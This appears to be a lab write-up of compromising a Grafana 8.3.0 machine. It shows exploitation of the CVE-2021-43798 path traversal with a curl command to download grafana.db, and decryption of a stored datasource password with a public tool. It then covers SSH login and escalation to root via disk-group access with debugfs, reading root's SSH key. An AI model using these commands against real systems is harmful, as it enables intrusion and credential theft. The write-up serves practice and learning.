ports 22. 3000 web, 9090 web

port 3000 - 
grafana 8.3.0 login page
searchsploit shows there's a dir-traversal -- file-disclosure vulnerability
multiple/webapps/50581.py
running the exploit, we see /etc/passwd
looks like "sysadmin" is the only other user, except for root
so we try to get their .ssh/id_rsa, .ssh/id_ecdsa
Neither seem to be there

port 9000 -
at http://192.168.131.181:9090/classic/flags we see config file is in /etc/prometheus/prometheus.yml
We can view this using the grafana file-disclosure vuln

|web.console.libraries|/etc/prometheus/console_libraries|
|web.console.templates|/etc/prometheus/consoles|

Nothing useful
after a bunch of head-bashing with port 9000, 

---
HINT TAKEN - we need to access /var/lib/grafana/grafana.db
the webpage https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/ shows detailed steps for all of it
following this,
```zsh
curl --path-as-is http://192.168.131.181:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db
#should download grafana.db
```
`sysadmin : anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==`

[https://github.com/jas502n/Grafana-CVE-2021-43798](https://github.com/jas502n/Grafana-CVE-2021-43798) can be used to decrypt the secureJsonData encrypted (AES-256 in CFB mode) format

```zsh
git clone https://github.com/jas502n/Grafana-CVE-2021-43798
cd Grafana-CVE....
#see AESDecrypt.go
vi AESDecrypt.go
#find the dataSourcePassword variable, change it to the password we found

go run AESDecrypt.go
#errors out, cuz of a missing module
#to add,

go mod init AESDecrypt.go
go mod tidy
#auto installs dependencies

go run AESDecrypt.go
SuperSecureP@ssw0rd
```
now we can ssh with this
`ssh sysadmin@IP`
sysadmin!

---
first command, `id` shows we are a member of disk group
```zsh
id
#notice the disk group
df -h
#list the mouted filesystems in human readable form
#look for something that is mounted to /
#here, it is /dev/sda2
debugfs /dev/sda2

#now, we can access /root
#cd root #ls #cat /root/proof.txt #cd .ssh #ls # cat id_rsa
```